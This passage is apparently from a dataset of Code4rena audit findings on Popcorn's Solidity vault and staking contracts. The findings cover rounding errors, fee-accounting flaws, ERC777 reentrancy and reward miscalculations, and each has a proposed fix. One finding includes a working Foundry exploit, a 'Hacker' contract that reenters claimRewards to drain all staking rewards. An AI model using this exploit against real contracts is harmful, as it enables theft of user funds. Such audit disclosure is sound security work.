It uses `Math.Rounding.Down` , but it should use `Math.Rounding.Up`  Assume that the vault with the following state:  - Total Asset = 1000 WETH - Total Supply = 10 shares  Assume that Alice wants to withdraw 99 WETH from the vault. Thus, she calls the\u00a0**`Vault.withdraw(99 WETH)`**\u00a0function.  The calculation would go like this:  ```solidity assets = 99 return value = assets * supply / totalAssets() return value = 99 * 10 / 1000 return value = 0 ```  The value would be rounded round to zero. This will be the amount of shares burned from users account, which is zero.   Hence user can drain the assets from the vault without burning their shares.   > Note : A similar issue also exists in `mint` functionality where `Math.Rounding.Down` is used and `Math.Rounding.Up` should be used. >   ### Recommendation  Use `Math.Rounding.Up` instead of `Math.Rounding.Down`.  As per OZ implementation here is the rounding method that should be used:  `deposit` : `convertToShares` \u2192 `Math.Rounding.Down`  `mint` : `converttoAssets` \u2192 `Math.Rounding.Up`  `withdraw` : `convertToShares` \u2192 `Math.Rounding.Up`  `redeem` : `convertToAssets` \u2192  `Math.Rounding.Down`"}, {"title": "Owner can collect management fees with a new increased fee for previous time period.", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/466", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-19"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L480 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L488 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L540 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L429   # Vulnerability details  ## Impact The Owner of the contract can change the fee, and after the rage quit period it can cash those fees for the period of time where different fees were active. This allows the Owner to collect as much management fee as it wants for an already passed time period, when it should only apply from the time it has been changed.  ## Proof of Concept This contract allows the Owner to change the fees. To do so the ``proposeFees()`` procedure is called. This procedure will update the proposed fees, which then can be applied by calling the ``changeFees()`` procedure after the rage quit period has passed (the rage quit period is a period of time that has to pass between proposing a fee and applying it).  To collect the fees, the Owner calls the procedure ``takeManagementAndPerformanceFees()``. This procedure contains the modifier ``takeFees()`` which collects the fees. ```     modifier takeFees() {         uint256 managementFee = accruedManagementFee();         uint256 totalFee = managementFee + accruedPerformanceFee();         uint256 currentAssets = totalAssets();         uint256 shareValue = convertToAssets(1e18);          if (shareValue > highWaterMark) highWaterMark = shareValue;          if (managementFee > 0) feesUpdatedAt = block.timestamp;          if (totalFee > 0 && currentAssets > 0)             _mint(feeRecipient, convertToShares(totalFee));          _;     } ```  Inside the ``takeFees()`` modifier the code ``if (managementFee > 0) feesUpdatedAt = block.timestamp;`` updates the variable ``feesUpdatedAt`` only if the fees are greater than 0. This variable is used as a timestamp of when was the las time fees were collected. ``managementFee`` is calculated using the function ``accruedManagementFees()``.  ``` function accruedManagementFee() public view returns (uint256) {         uint256 managementFee = fees.management;         return             managementFee > 0                 ? managementFee.mulDiv(                     totalAssets() * (block.timestamp - feesUpdatedAt),                     SECONDS_PER_YEAR,                     Math.Rounding.Down                 ) / 1e18                 : 0;     } ```   Here the ``managementFee`` is calculated using the ``feesUpdatedAt`` variable. In the calculation, the further apart the ``feesUpdated`` is in comparison to the ``block.timestamp``, the greater the fee will be.   This ``feesUpdatedAt`` variable is not updated when the fee is changed using ``changeFee()`` or when the fees are proposed using ``proposeFee()``. This allows the owner to collect a fee for a period of time where the fee was different.    **Current behaviour:** ```                        Change fee to 2                               |                               v            Collect fees with   Fee = 0                   Fee = 2        managementFee = 2     |                         |                    |     v                         v                    v   -----------------------------------------------------     ^                         ^                    ^     |                         |                    | | Day 0                     Day 5                 Day 7 | |                                                       | +-------------------------------------------------------+                      Period of time of fees                      collected with                      management fee = 2 ```  **Ideal behaviour:** ```                             Change fee to 2                                   |                                   v            Collect fees with       Fee = 0                   Fee = 2        managementFee = 2         |                         |                    |         v                         v                    v       -----------------------------------------------------         ^                         ^                    ^         |                         |                    |     | Day 0                     Day 5                 Day 7 |     |                             |                         |     +-----------------------------+-------------------------+        Period of time of fees        Period of time of fees        collected with                collected with        management fee = 0            management fee = 2    ```  The diagrams show how the management fees are charged for a period of time where they were not active. The ideal behaviour diagram shows how it should behave in order to apply the management fees fairly.     **Steps:**  1. Create vault with 0 fees 2. Wait x amount of days 3. Change fee to something bigger than the previous fee 4. Collect the fees (fees collected will be from creation of vault until now with the new fee)  With this 4 steps a Vault creator can charge a new management fee for period of time where a different fee was active.    ## Tools Used Visual Studio Code  ## Recommended Mitigation Steps The variable ``feesUpdatedAt`` should be updated even when the fees are 0. Fees should be collected when a new fee is applied, therefore the time period where the former fee was current will be collected correctly and the ``feesUpdatedAt`` variable will be updated to the timestamp of when the new fee has been applied."}, {"title": "erc777 cross function re-entrancy", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/453", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "selected for report", "sponsor confirmed", "M-20"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol?plain=1#L153   # Vulnerability details  ## Summary  When an erc777 is used as asset for the vault, you can re-enter the _mint function by minting the double you would have minted with a normal erc20 token.  ## Vulnerability Detail The following 2 functions allow minting in the vault. One is for depositing a certain amount of assets, in this case, erc777 and getting shares in exchange, and the second one is to calculate the number of assets you have to send to mint \"x\" shares. The problem relies on the following lines:  deposit function:         _mint(receiver, shares);          asset.safeTransferFrom(msg.sender, address(this), assets);          adapter.deposit(assets, address(this));   The erc777 has a callback to the owner of the tokens before doing transferFrom. In this case, it is a vulnerable function because it is minting the shares before we transfer the tokens. So, on the callback that transferFrom makes to our attacker contract, we directly call the other mint function that is also publicly callable by anyone. The reason why we can't re-enter the deposit is that it has a `nonReentrant` modifier, so we have to perform a cross-function re-entrancy.  mint function:          _mint(receiver, shares);          asset.safeTransferFrom(msg.sender, address(this), assets);          adapter.deposit(assets, address(this));   So eventually, you will be able to get twice as much shares everytime you deposit.   https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol?plain=1#L134-L157 https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol?plain=1#L170-L198   ## Impact Eventually you will be able to mint twice as much as you provide assets.   ## Tool used Manual Review  ## Recommendation The changes that have to be made are 2:  Either state clearly that erc777 are not supported, or change the flow of the function, transferring first the assets and then getting the shares.                 asset.safeTransferFrom(msg.sender, address(this), assets); //changed to the top of the function         _mint(receiver, shares);         adapter.deposit(assets, address(this));"}, {"title": "AdapterBase should always use delegatecall to call the functions in the strategy", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/435", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-21"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L479-L483   # Vulnerability details  ## Impact The strategy contract will generally let the Adapter contract use delegatecall to call its functions So IAdapter(address(this)).call is used frequently in strategy contracts, because when the Adapter calls the strategy's functions using delegatecall, address(this) is the Adapter ```solidity   function harvest() public override {     address router = abi.decode(IAdapter(address(this)).strategyConfig(), (address));     address asset = IAdapter(address(this)).asset();     ... ``` But in AdapterBase._verifyAndSetupStrategy, the verifyAdapterSelectorCompatibility/verifyAdapterCompatibility/setUp functions are not called with delegatecall, which causes the context of these functions to be the strategy contract ```solidity     function _verifyAndSetupStrategy(bytes4[8] memory requiredSigs) internal {         strategy.verifyAdapterSelectorCompatibility(requiredSigs);         strategy.verifyAdapterCompatibility(strategyConfig);         strategy.setUp(strategyConfig);     } ``` and since the strategy contract does not implement the interface of the Adapter contract, these functions will fail, making it impossible to create a Vault using that strategy. ```solidity   function verifyAdapterCompatibility(bytes memory data) public override {     address router = abi.decode(data, (address));     address asset = IAdapter(address(this)).asset(); ``` More dangerously, if functions such as setup are executed successfully because they do not call the Adapter's functions, they may later error out when calling the havest function because the settings in setup are invalid ## Proof of Concept https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L479-L483 ## Tools Used None ## Recommended Mitigation Steps In AdapterBase._verifyAndSetupStrategy, the verifyAdapterSelectorCompatibility/verifyAdapterCompatibility/setUp functions are called using delegatecall"}, {"title": "Incorrect Reward Duration After Change in Reward Speed in MultiRewardStaking", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/424", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "selected for report", "sponsor confirmed", "H-03"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L305-L312   # Vulnerability details  ## Impact When the reward speed is changed in `MultiRewardStaking`, the new end time is calculated based off of the balance of the reward token owned by the contract. This, however, is not the same as the number of reward tokens that are left to be distributed since some of those tokens may be owed to users who have not collected their rewards yet. As a result, some users may benefit from earning rewards past the end of the intended reward period, and leaving the contract unable to pay the rewards it owes other users.  ## Proof of Concept A simple Foundry test I wrote demonstrates that the contracts fail to calculate the rewards properly after the reward speed is changed: ```// SPDX-License-Identifier: GPL-3.0 // Docgen-SOLC: 0.8.15  pragma solidity ^0.8.15;  import { Test } from \"forge-std/Test.sol\"; import { SafeCastLib } from \"solmate/utils/SafeCastLib.sol\"; import { MockERC20 } from \"./utils/mocks/MockERC20.sol\"; import { IMultiRewardEscrow } from \"../src/interfaces/IMultiRewardEscrow.sol\"; import { MultiRewardStaking, IERC20 } from \"../src/utils/MultiRewardStaking.sol\"; import { MultiRewardEscrow } from \"../src/utils/MultiRewardEscrow.sol\";  contract AuditTest is Test {   using SafeCastLib for uint256;    MockERC20 stakingToken;   MockERC20 rewardToken1;   MockERC20 rewardToken2;    IERC20 iRewardToken1;   IERC20 iRewardToken2;    MultiRewardStaking staking;   MultiRewardEscrow escrow;    address alice = address(0xABCD);   address bob = address(0xDCBA);   address feeRecipient = address(0x9999);     bytes32 constant PERMIT_TYPEHASH =     keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");    event RewardInfoUpdate(IERC20 rewardsToken, uint160 rewardsPerSecond, uint32 rewardsEndTimestamp);   event RewardsClaimed(address indexed user, IERC20 rewardsToken, uint256 amount, bool escrowed);    function setUp() public {     vm.label(alice, \"alice\");     vm.label(bob, \"bob\");      stakingToken = new MockERC20(\"Staking Token\", \"STKN\", 18);      rewardToken1 = new MockERC20(\"RewardsToken1\", \"RTKN1\", 18);     rewardToken2 = new MockERC20(\"RewardsToken2\", \"RTKN2\", 18);     iRewardToken1 = IERC20(address(rewardToken1));     iRewardToken2 = IERC20(address(rewardToken2));      escrow = new MultiRewardEscrow(address(this), feeRecipient);      staking = new MultiRewardStaking();     staking.initialize(IERC20(address(stakingToken)), IMultiRewardEscrow(address(escrow)), address(this));   }    function _addRewardToken(MockERC20 rewardsToken) internal {     rewardsToken.mint(address(this), 10 ether);     rewardsToken.approve(address(staking), 10 ether);      staking.addRewardToken(IERC20(address(rewardsToken)), 0.1 ether, 10 ether, false, 0, 0, 0);   }    function test__endtime_after_change_reward_speed() public {     _addRewardToken(rewardToken1);      stakingToken.mint(alice, 1 ether);     stakingToken.mint(bob, 1 ether);      vm.prank(alice);     stakingToken.approve(address(staking), 1 ether);     vm.prank(bob);     stakingToken.approve(address(staking), 1 ether);      vm.prank(alice);     staking.deposit(1 ether);      // 50% of rewards paid out     vm.warp(block.timestamp + 50);      vm.prank(alice);     staking.withdraw(1 ether);     assertEq(staking.accruedRewards(alice, iRewardToken1), 5 ether);      // Double Accrual (from original)     staking.changeRewardSpeed(iRewardToken1, 0.2 ether); // Twice as fast now      vm.prank(bob);     staking.deposit(1 ether);      // The remaining 50% of rewards paid out     vm.warp(block.timestamp + 200);      vm.prank(bob);     staking.withdraw(1 ether);     assertEq(staking.accruedRewards(bob, iRewardToken1), 5 ether);   }  } ```  The output of the test demonstrates an incorrect calculation: ``` [FAIL. Reason: Assertion failed.] test__endtime_after_change_reward_speed() (gas: 558909) Logs:   Error: a == b not satisfied [uint]     Expected: 5000000000000000000       Actual: 20000000000000000000  Test result: FAILED. 0 passed; 1 failed; finished in 6.12ms ```  Notice that the amount of reward tokens given to Bob is more than the amount owned by the contract!  ## Tools Used  I reproduced the bug simply by adding a test within the existing foundry project.  ## Recommended Mitigation Steps  There is a nice accounting trick to make sure the remaining time is calculated correctly without needing to keep track of how much you owe to users that has not been paid out yet. I would suggest changing the vulnerable code in `changeRewardSpeed` to:  ```     uint32 prevEndTime = rewards.rewardsEndTimestamp;      uint256 remainder = prevEndTime > block.timestamp ? (uint256(prevEndTime) - block.timestamp) * rewards.rewardsPerSecond : 0;      uint32 rewardsEndTimestamp = _calcRewardsEnd(       block.timestamp.safeCastTo32(),       rewardsPerSecond,       remainder     ); ```"}, {"title": "Staking rewards can be drained", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/402", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-04"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L170-L187   # Vulnerability details  ## Impact  If ERC777 tokens are used for rewards, the entire balance of rewards in the staking contract can get drained by an attacker.  ## Proof of Concept  ERC777 allow users to register a hook to notify them when tokens are transferred to them.   This hook can be used to reenter the contract and drain the rewards.  The issue is in the `claimRewards` in `MultiRewardStaking`. The function does not follow the checks-effects-interactions pattern and therefore can be reentered when transferring tokens in the for loop. https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L170-L187 ```   function claimRewards(address user, IERC20[] memory _rewardTokens) external accrueRewards(msg.sender, user) {     for (uint8 i; i < _rewardTokens.length; i++) {       uint256 rewardAmount = accruedRewards[user][_rewardTokens[i]];        if (rewardAmount == 0) revert ZeroRewards(_rewardTokens[i]);        EscrowInfo memory escrowInfo = escrowInfos[_rewardTokens[i]];        if (escrowInfo.escrowPercentage > 0) {         _lockToken(user, _rewardTokens[i], rewardAmount, escrowInfo);         emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, true);       } else {         _rewardTokens[i].transfer(user, rewardAmount);         emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, false);       }        accruedRewards[user][_rewardTokens[i]] = 0;     } ```  As can be seen above, the clearing of the `accruedRewards` is done AFTER the transfer when it should be BEFORE the transfer.   ### Foundry POC The POC demonstrates and end-to-end attack including a malicious hacker contract that steals all the balance of the reward token.  Add the following file (drainRewards.t.sol) to the test directory: https://github.com/code-423n4/2023-01-popcorn/tree/main/test ``` // SPDX-License-Identifier: GPL-3.0 // Docgen-SOLC: 0.8.15  pragma solidity ^0.8.15;  import { Test } from \"forge-std/Test.sol\"; import { MockERC20 } from \"./utils/mocks/MockERC20.sol\"; import { IMultiRewardEscrow } from \"../src/interfaces/IMultiRewardEscrow.sol\"; import { MultiRewardStaking, IERC20 } from \"../src/utils/MultiRewardStaking.sol\"; import { MultiRewardEscrow } from \"../src/utils/MultiRewardEscrow.sol\";  import { ERC777 } from \"openzeppelin-contracts/token/ERC777/ERC777.sol\";  contract MockERC777 is ERC777 {   uint8 internal _decimals;   mapping(address => address) private registry;      constructor() ERC777(\"MockERC777\", \"777\", new address[](0)) {}     function decimals() public pure override returns (uint8) {     return uint8(18);   }    function mint(address to, uint256 value) public virtual {     _mint(to, value, hex'', hex'', false);   }    function burn(address from, uint256 value) public virtual {     _mint(from, value, hex'', hex'');   } }  contract Hacker {     IERC20[] public rewardsTokenKeys;     MultiRewardStaking staking;     constructor(IERC20[] memory _rewardsTokenKeys, MultiRewardStaking _staking){       rewardsTokenKeys = _rewardsTokenKeys;       staking = _staking;        // register hook       bytes32 erc777Hash = keccak256(\"ERC777TokensRecipient\");       bytes memory data = abi.encodeWithSignature(\"setInterfaceImplementer(address,bytes32,address)\", address(this), erc777Hash, address(this));       address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).call(data);     }      // deposit into staking     function approveAndDeposit() external {       IERC20 stakingToken = IERC20(staking.asset());       stakingToken.approve(address(staking), 1 ether);       staking.deposit(1 ether);     }      function startHack() external {       // Claim and reenter until staking contract is drained       staking.claimRewards(address(this), rewardsTokenKeys);     }     function tokensReceived(         address operator,         address from,         address to,         uint256 amount,         bytes calldata userData,         bytes calldata operatorData     ) external {       // continue as long as the balance of the reward token is positive       // In real life, we should check the lower boundry to prevent a revert       // when trying to send more then the balance.       if(ERC777(msg.sender).balanceOf(address(staking)) > 0){         staking.claimRewards(address(this), rewardsTokenKeys);       }     } }  contract DrainRewards is Test {   MockERC20 stakingToken;   MockERC777 rewardToken1;   IERC20 iRewardToken1;   MultiRewardStaking staking;   MultiRewardEscrow escrow;    address feeRecipient = address(0x9999);       function setUp() public {     stakingToken = new MockERC20(\"Staking Token\", \"STKN\", 18);     rewardToken1 = new MockERC777();     iRewardToken1 = IERC20(address(rewardToken1));     escrow = new MultiRewardEscrow(address(this), feeRecipient);     staking = new MultiRewardStaking();     staking.initialize(IERC20(address(stakingToken)), IMultiRewardEscrow(address(escrow)), address(this));   }    function _addRewardToken(MockERC777 rewardsToken) internal {     rewardsToken.mint(address(this), 10 ether);     rewardsToken.approve(address(staking), 10 ether);     staking.addRewardToken(IERC20(address(rewardsToken)), 0.1 ether, 10 ether, false, 0, 0, 0);   }    function test__claim_reentrancy() public {     // Prepare array for `claimRewards`     IERC20[] memory rewardsTokenKeys = new IERC20[](1);     rewardsTokenKeys[0] = iRewardToken1;      // setup hacker contract     Hacker hacker = new Hacker(rewardsTokenKeys, staking);     address hackerAddr = address(hacker);     stakingToken.mint(hackerAddr, 1 ether);     hacker.approveAndDeposit();      // Add reward token to staking      _addRewardToken(rewardToken1);      // 10% of rewards paid out     vm.warp(block.timestamp + 10);      // Get the full rewards held by the staking contract     uint256 full_rewards_amount = iRewardToken1.balanceOf(address(staking));      // Call hacker to start claiming the rewards and reenter     hacker.startHack();      // validate we received 100% of rewards (10 eth)     assertEq(rewardToken1.balanceOf(hackerAddr), full_rewards_amount);   } } ```  To run the POC, execute the following command: ``` forge test -m \"test__claim_reentrancy\" --fork-url=<MAINNET FORK> ```  Expected results: ``` Running 1 test for test/drainRewards.t.sol:DrainRewards [PASS] test__claim_reentrancy() (gas: 1018771) Test result: ok. 1 passed; 0 failed; finished in 6.46s ```  ## Tools Used  Foundry, VS Code  ## Recommended Mitigation Steps  Follow the checks-effects-interactions pattern and clear out `accruedRewards[user][_rewardTokens[i]]` before transferring.  Additionally, it would be a good idea to add a ReentrancyGuard modifier to the function "}, {"title": "Vault fees can be set to anything when initilizing", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/396", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-22"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L57   # Vulnerability details  ## Impact The vault owner can charge any fees when initializing. Because of this a lot of problems can occur 1. If the fees are set at 1e18, the withdraw function won't work as it will cause division by 0 error. 2. If all the fees are set beyond 1e18, many of the functions won't work due to arithmetic overflow.  ## Proof of Concept Below is the code where the fees can be set to anything during the initialization ``` function initialize(         IERC20 asset_,         IERC4626 adapter_,         VaultFees calldata fees_,         address feeRecipient_,         address owner     ) external initializer {        //code         fees = fees_;       // code ``` Here is a test to confirm the same ``` function test_Vault_any_Fees() public{     address vaultAddress1 = address(new Vault());     Vault vault1;     vault1 = Vault(vaultAddress1);     vault1.initialize(       IERC20(address(asset)),       IERC4626(address(adapter)),       VaultFees({ deposit: 2e18, withdrawal: 2e18, management: 2e18, performance: 2e18 }),       feeRecipient,       address(this)     );   } ```  ## Tools Used Manual review, Foundry tests  ## Recommended Mitigation Steps Add a revert statement like this  ``` if (             newFees.deposit >= 1e18 ||             newFees.withdrawal >= 1e18 ||             newFees.management >= 1e18 ||             newFees.performance >= 1e18         ) revert InvalidVaultFees(); ```"}, {"title": "Lost Rewards in MultiRewardStaking Upon Third-Party Withdraw", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/386", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "selected for report", "sponsor confirmed", "H-06"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L127   # Vulnerability details  ## Impact  Affected contract: `MultiRewardStaking`  When assets are withdrawn for user `Alice` by an approved user `Bob` to a receiver that is not `Alice`, the rewards are never accrued and the resulting **staking rewards are lost forever**. This is because `accrueRewards` is called on `caller` and `receiver` but never `owner`.  Third-party withdrawals are allowed by the fact that `withdraw(uint256, address, address)` exists in `ERC4626Upgradeable` and is never overwritten by a method with the same signature. Protocols composing with Popcorn will assume by the nature of this contract being an `ERC4626` that this method is safe to use when it in fact costs the user significantly.   ## Proof of Concept I created a test to reproduce this bug. When I included the below code within `MultiRewardStaking.t.sol` it passed, meaning Alice and Bob both had no rewards to claim by the end:  ``` function test__withdraw_bug() public {     // Add a reward token     _addRewardToken(rewardToken1); // adds at 0.1 per second      // Make a deposit for Alice     stakingToken.mint(alice, 1 ether);     vm.prank(alice);     stakingToken.approve(address(staking), 1 ether);     assertEq(stakingToken.allowance(alice, address(staking)), 1 ether);      assertEq(staking.balanceOf(alice), 0);     vm.prank(alice);     staking.deposit(1 ether);     assertEq(staking.balanceOf(alice), 1 ether);      // Move 10 seconds into the future     vm.warp(block.timestamp + 10); // 1 ether should be owed to Alice in rewards      // Approve Bob for withdrawal     vm.prank(alice);     staking.approve(bob, 1 ether);      // Bob withdraws to himself     vm.prank(bob);     staking.withdraw(1 ether, bob, alice);     assertEq(staking.balanceOf(alice), 0);     assertEq(stakingToken.balanceOf(bob), 1 ether);      IERC20[] memory rewardsTokenKeys = new IERC20[](1);     rewardsTokenKeys[0] = iRewardToken1;      // Alice has no rewards to claim     vm.prank(alice);     vm.expectRevert(abi.encodeWithSelector(MultiRewardStaking.ZeroRewards.selector, iRewardToken1));     staking.claimRewards(alice, rewardsTokenKeys);      // Bob has no rewards to claim     vm.prank(bob);     vm.expectRevert(abi.encodeWithSelector(MultiRewardStaking.ZeroRewards.selector, iRewardToken1));     staking.claimRewards(bob, rewardsTokenKeys);   } ```  One can similarly create a test that doesn't expect the calls at the end to revert and that test will fail.  ## Tools Used  I reproduced the bug simply by adding a test within the existing foundry project.  ## Recommended Mitigation Steps  1) Fix the code by changing [this line of code](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L127) in `_withdraw` to instead call `_accrueRewards(owner, receiver)`. It is okay to not accrue the rewards on `caller` since the caller neither gains nor loses staked tokens.  2) Add a similar test as above in `MultiRewardStaking.t.sol` that **will fail** if Alice is unable to withdraw `1 ether` of rewards in the end."}, {"title": "syncFeeCheckpoint()  does not modify the highWaterMark correctly, sometimes it might even decrease its value, resulting charging more performance fees than it should", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/365", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "M-23"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L496-L499   # Vulnerability details  ## Impact Detailed description of the impact of this finding. ``syncFeeCheckpoint()``  does not modify the ``highWaterMark`` correctly, sometimes it might even decrease its value, resulting charging more performance fees than it should.   ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.  The ``Vault.syncFeeCheckpoint()`` function does not modify the ``highWaterMark`` correctly, sometimes it might even decrease its value, resulting charging more performance fees than it should.  Instead of updating with a higher share values, it might actually decrease the value of ``highWaterMark``. As a result more performance fees might be charged since the ``highWaterMark`` was brought down again and again.   [https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol# L496-L499](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L496-L499)    ```  modifier syncFeeCheckpoint() {         _;         highWaterMark = convertToAssets(1e18);     } ```  1) Suppose the current ``highWaterMark = 2 * e18`` and ``convertToAssets(1e18) = 1.5 * e18``.   2) After ``deposit()`` is called, since the ``deposit()`` function has the ``synFeeCheckpoint`` modifier, the ``highWaterMark`` will be incorrectly reset to ``1.5 * e18``.  3) Suppose after some activities, ``convertToAssets(1e18) = 1.99 * e18``.     4) ``TakeFees()`` is called, then the performance fee will be charged, since it wrongly decides ``convertToAssets(1e18) > highWaterMark`` with the wrong ``highWaterMark = 1.5 * e18``. The correct ``highWaterMark`` should be ``2 * e18``  ```javascript  modifier takeFees() {         uint256 managementFee = accruedManagementFee();         uint256 totalFee = managementFee + accruedPerformanceFee();         uint256 currentAssets = totalAssets();         uint256 shareValue = convertToAssets(1e18);          if (shareValue > highWaterMark) highWaterMark = shareValue;          if (managementFee > 0) feesUpdatedAt = block.timestamp;          if (totalFee > 0 && currentAssets > 0)             _mint(feeRecipient, convertToShares(totalFee));          _;     } function accruedPerformanceFee() public view returns (uint256) {         uint256 highWaterMark_ = highWaterMark;         uint256 shareValue = convertToAssets(1e18);         uint256 performanceFee = fees.performance;          return             performanceFee > 0 && shareValue > highWaterMark                 ? performanceFee.mulDiv(                     (shareValue - highWaterMark) * totalSupply(),                     1e36,                     Math.Rounding.Down                 )                 : 0;     } ``` 5) As a result, the performance fee is charged when it is not supposed to do so. Investors might not be happy with this.  ## Tools Used Remix  ## Recommended Mitigation Steps Revise the ``syncFeeCheckpoint()`` as follows:   ```  modifier syncFeeCheckpoint() {         _;                uint256 shareValue = convertToAssets(1e18);          if (shareValue > highWaterMark) highWaterMark = shareValue;     } ```"}, {"title": "Accrued perfomance fee calculation takes wrong assumptions for share decimals, leading to loss of shares or hyperinflation", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/306", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-24"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L529-L542 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L447-L460   # Vulnerability details  This issue applies to both `AdapterBase.sol` and `Vault.sol`. For the sake of simplicity and brevity, this POC will describe just the former.  ## Impact Fee calculation is wrong and it either takes too few or too many shares than what is supposed to be when calculating the `accruedPerformanceFee` and the shares decimals are not `18`.  The former causes a loss of shares that the `FEE_RECIPIENT` should earn, but the latter causes hyperinflation, which makes users' shares worthless.   ## Proof of Concept `accruedPerformanceFee` doesn't take into consideration the shares' decimals, and it supposes that it's always `1e18`.  This is supposed to be a percentage and it's calculated as the following, rounding down.  ```solidity function accruedPerformanceFee() public view returns (uint256) {     uint256 highWaterMark_ = highWaterMark;     uint256 shareValue = convertToAssets(1e18);     uint256 performanceFee_ = performanceFee;      return         performanceFee_ > 0 && shareValue > highWaterMark_             ? performanceFee_.mulDiv(                 (shareValue - highWaterMark_) * totalSupply(),                 1e36,                 Math.Rounding.Down             )             : 0; } ```  This calculation is wrong because the assumption is:  ``` totalSupply (1e18) * performanceFee_ (1e18) = 1e36 ```  which is not always true because the `totalSupply` decimals can be greater or less than that.  Let's see what would happen in this case.  ### Best case scenario: `supply decimals < 1e18`  In this case, the fee calculation will always round to zero, thus the `FEE_RECIPIENT` will never get the deserved accrued fees.  ### Worst case scenario: `supply decimals > 1e18`  The `FEE_RECIPIENT` will get a highly disproportionate number of shares.   This will lead to share hyperinflation, which will also impact the users, making their shares worthless.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Modify the fee calculation so it's divided with the correct denominator, that takes into account the share decimals:  ```solidity performanceFee_ > 0 && shareValue > highWaterMark_ ? performanceFee_.mulDiv(     (shareValue - highWaterMark_) * totalSupply(),     1e18 * (10 ** decimals()),     Math.Rounding.Down ) : 0; ``"}, {"title": "**Harvest()** may not be executed when changing a **Vault** adapter", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/284", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "selected for report", "sponsor confirmed", "edited-by-warden", "M-26"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L594-L613 https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L162   # Vulnerability details  ## Impact Changing the adapter (that uses a strategy) of an already credited vault can result in a loss of user funds.  ## Proof of Concept **Senario :**  - A **Vault** owner want to change the underlying **Adapter**  - Owner call the **proposeAdapter()** and then **changeAdapter()** that will call the **redeem()** adapter function :   -  